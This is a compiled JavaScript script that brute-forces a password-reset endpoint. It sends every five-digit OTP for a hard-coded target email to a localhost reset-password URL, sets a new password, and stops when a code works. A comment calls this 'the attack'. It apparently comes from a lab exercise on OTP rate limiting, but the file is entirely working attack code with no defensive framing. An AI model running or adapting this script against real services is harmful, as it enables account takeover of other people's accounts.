"use strict";
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
const axios_1 = __importDefault(require("axios"));
const TARGET_EMAIL = "abhishek@gmail.com";
function tryOtp(otp) {
    return __awaiter(this, void 0, void 0, function* () {
        try {
            const res = yield axios_1.default.post("http://localhost:9000/reset-password", {
                email: TARGET_EMAIL,
                otp,
                newPassword: "NewSecurePass@123",
            });
            if (res.data.success) {
                console.log(`✅ FOUND OTP: ${otp}`);
                process.exit(0); // Stop the attack
            }
            else {
                console.log(`❌ Tried OTP: ${otp}`);
            }
        }
        catch (error) {
            console.log(`❌ Request failed for OTP: ${otp}`);
        }
    });
}
const MIN = 10000;
const MAX = 99999;
const BATCH_SIZE = 100;
function brutforce() {
    return __awaiter(this, void 0, void 0, function* () {
        for (let i = MIN; i < MAX; i += BATCH_SIZE) {
            let batch = [];
            for (let j = i; j < i + BATCH_SIZE; j++) {
                batch.push(yield tryOtp(j.toString()));
            }
            Promise.all(batch);
        }
    });
}
brutforce();
